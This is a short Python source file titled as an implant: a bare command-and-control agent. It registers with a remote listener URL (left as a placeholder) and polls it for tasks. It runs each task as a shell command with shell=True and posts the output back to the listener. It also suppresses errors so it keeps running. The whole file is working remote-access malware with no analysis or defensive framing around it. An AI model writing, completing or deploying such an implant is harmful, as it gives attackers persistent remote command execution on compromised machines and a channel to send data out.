#Python Implant - Vanilla Version
from urllib import request, parse
import time
import os
import json
import subprocess

agentid = ""
while True:
    url = "AWS_URL_LISTENER_HERE"
    try:
        if (agentid == ''):
            req = request.Request(url + 'agent-registration')
            response = request.urlopen(req)
            agentid = response.read().decode()
        else:
            req =  request.Request(url + "?hostid=" + agentid)
            response = request.urlopen(req)
            getTask = response.read().decode()
            if (getTask == ''):
                time.sleep(1)
            else:
                taskID = getTask.split(":")[0]
                command = getTask.replace("{}:".format(taskID),"")
                proc = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                output = proc.stdout.read().decode() + proc.stderr.read().decode()
                body = {"hostid":"{}".format(agentid),"taskid":"{}".format(taskID),"task":"{}".format(command),"taskResponse":"{}".format(output)}
                req =  request.Request(url, data=json.dumps(body).encode())
                resp = request.urlopen(req)
        time.sleep(1)
    except:
        time.sleep(10)
